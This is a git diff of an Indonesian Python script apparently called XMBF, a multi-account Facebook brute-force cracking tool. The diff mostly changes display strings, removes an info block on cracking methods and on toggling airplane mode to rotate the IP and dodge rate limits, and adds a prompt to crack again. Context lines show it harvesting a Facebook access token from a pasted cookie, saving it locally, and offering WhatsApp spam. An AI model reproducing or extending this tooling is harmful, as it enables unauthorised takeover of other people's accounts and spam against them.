@@ -63,7 +63,7 @@ from rich.table import Table
 from rich.columns import Columns
 from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
 console = Console()
-sys.stdout.write('\x1b]2;XMBF | XYZON MULTI BRUTE FACEBOOK\x07')
+sys.stdout.write('\x1b]2;XMBF | XYZON MULTI BRUTE FORCE\x07')
 #---------Tahun---------#
 def tahun(fx):
 	if len(fx)==15:
@@ -331,60 +331,7 @@ def clear():
 	os.system('clear')
 def back():
 	login()
-#INGFO AUTHOR KONTOL
-def ingfoh():
-	print (
-f"""{Hj}
- • Info script :
- 	
- - author      : Romi Afrizal
- - instagram   : romz_xyz
- - facebook    : facebook.com/romi.afrizal.102
- - fanspage    : facebook.com/100022086172556
- - whatsap     : +6282371648186
- - github      : github.com/Mark-Zuck
- - script name : bff-2
- - version     : 1.3
- - update pada : 21 Februari 2022
- 
-+ ---------------------------------------- +
-            TENTANG METODE CRACK
-+ ---------------------------------------- +
- - b-api: Metode ini proses nya sangat cepat
-          tapi rawan spam jadi wajar hasil nya
-          tidak memuaskan dan jarang dapat hasil
 
-- mbasic: Metode ini proses nya lumayan lambat
-          tapi jika menggunakan metode ini hasil 
-          yg di dapat memuaskan dan jarang kena
-          spam
-
-- mobile: Metode ini proses nya sangat lambat 
-          tapi jika menggunakan metode ini hasil
-          yg di dapat sangat memuaskan dan jarang 
-          kena spam
-
-+ ---------------------------------------- +
-             TIDAK SUPORT KARTU 
-+ ---------------------------------------- +
-- Kartu Telkomsel tidak suport untuk crack
-  jadi wajar jika tidak dapat hasil atau lama
-  pada saat crack, Karena rawan spam.
-  Rekomendasi kartu Axis, XL.
- 
-+ ---------------------------------------- +
-                MODE PESAWAT
-+ ---------------------------------------- +
-- Jika gunakan mode pesawat itu guna nya 
-  akan melewati beberapa ID dan merubah IP 
-  kita pada saat proses crack. Cukup gunakan
-  mode pesawat 1-2 detik saja. Jika gunakan 
-  mode pesawat terlalu lama maka akan semakin
-  banyak ID yg terlewatkan. Maka dari itu cukup
-  gunakan 1-2 detik saja.
-  
-{Mr}!{Mt} Jika bug/error pada script harap lapor saya
-""")
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	cetak(panel(f"""
@@ -430,7 +377,7 @@ def login123():
 		time.sleep(3)
 		exit()
 	else:
-		print(' [+] \33[1;91mPilih Yang Bener Asu ')
+		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91mPilih Yang Bener Asu ')
 		time.sleep(5)
 		back()
 		
@@ -447,7 +394,7 @@ def login():
 		except KeyError:
 			login123()
 		except requests.exceptions.ConnectionError:
-			li = ' Lu Kagak Ada Sinyal Anjirt Silahkan Beli Sinyal Di Sugeng Kalo Mau Carck'
+			li = ' Lu Kagak Ada Sinyal Anjirt Silahkan Beli Sinyal Di Konter Kalo Mau Carck'
 			lo = mark(li, style='red')
 			sol().print(lo, style='cyan')
 			exit()
@@ -457,7 +404,7 @@ def login():
 def laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadimariketemupepekkudajanganlarislebewindonesiaandlampungnihbossenggoldongnantimatiawokawokawokaowkawokawokawokawok():
 	try:
 		cetak(nel('[bold cyan]Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account Facebook',width=90,title=f"[bold red][[bold green] Cookies [bold red]]",style=f"bold red"))
-		your_cookies = input(' Cookie  : ')
+		your_cookies = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mCookie  : \x1b[1;97m')
 		with requests.Session() as r:
 			try:
 				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
@@ -469,7 +416,7 @@ def laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadima
 				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
 				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
 				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-					print(" {P}[{H}+{P}] \33[1;91m Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
+					print(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91m Cookie Anda Busuk", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
 				else:
 					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
 					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
@@ -501,11 +448,11 @@ def laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadima
 							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
 							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
 							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							print(f"\n Token : {access_token}")
+							print(f"\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Token : \x1b[1;97m{access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							print(" [+] \33[1;92mLogin Berhasil | Ketik Perintah Di Bawah Ini")
-							print(" [+] \33[1;96mpython run.py");exit()
+							print(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \33[1;92mLogin Berhasil | Ketik Perintah Di Bawah Ini")
+							print(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \33[1;96mpython run.py");exit()
 			except Exception as e:
 				print(" [+]\33[1;91m Cookies Tidak Dapat Di Akses")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
@@ -520,7 +467,7 @@ def menu(my_name,my_id):
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	except IOError:
-		print(' [+]\33[1;91m Cookies Kadaluarsa ')
+		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;91m Cookies Kadaluarsa ')
 		time.sleep(5)
 		login()
 	os.system('clear')
@@ -560,7 +507,7 @@ def menu(my_name,my_id):
 	elif _____xyzon___xd____ in('14','014'):
 		spam_wa()
 	elif _____xyzon___xd____ in('15','015'):
-		ingfoh()
+		info_ngentod()
 	elif _____xyzon___xd____ in('16','016'):
 		cetak(panel(f"[bold cyan]Apapun Bug Pada Script Tolong Laporkan Kepada Saya Agar Bisa Mengembangkan Sc Ini Semakin Dikit Bugnya Semakin Baik Sc Ini , Anda Akan Di Arahkan Ke WhatsApp",width=90,title=f"[bold red][[bold green] Report Bug [bold red]]",style=f"bold red"))
 		os.system("xdg-open https://wa.me/+6282183929059?text=Asalammualikum+Bang+Saya+Mau+Melaporkan+Bug+Pada+Sc+Mu+Bang")
@@ -571,7 +518,7 @@ def menu(my_name,my_id):
 	elif _____xyzon___xd____ in('0','00'):
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print(f' [+]{m} Sukses Logout{x}')
+		jalan(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]{m} Sukses Logout{x}')
 		time.sleep(5)
 		login()
 	else:
@@ -1719,9 +1666,17 @@ def passwrd():
 		print('')
 	print(M+' <------------------------------------------------------------------------------------->')
 	print(f' \33[1;96m Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
-	print(f'  [{h}•{x}]{h} OK : {h}%s '%(ok))
+	print(f'{x}  [{h}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
-
+	print('')
+	print('\x1b[1;97m[\x1b[1;92m?\x1b[1;97m]\x1b[1;93m \x1b[1;96mApakah Anda Ingin Crack Facebook Lagi Y/T')
+	xyzondsini = input('\x1b[1;97m[\x1b[1;92m?\x1b[1;97m]\x1b[1;93m \x1b[1;96mPilih : \x1b[1;93m')
+	if xyzondsini in ['y','Y']:
+		back()
+	else:
+		print(f'\T{K}>>{O} Selamat Tinggal | Xyzon Dev {K} << ')
+		time.sleep(2)
+		exit('\n')
 #--------------------[ METODE MOBILE ]-----------------#
 def crack(idf,pwv):
 	global loop,ok,cp
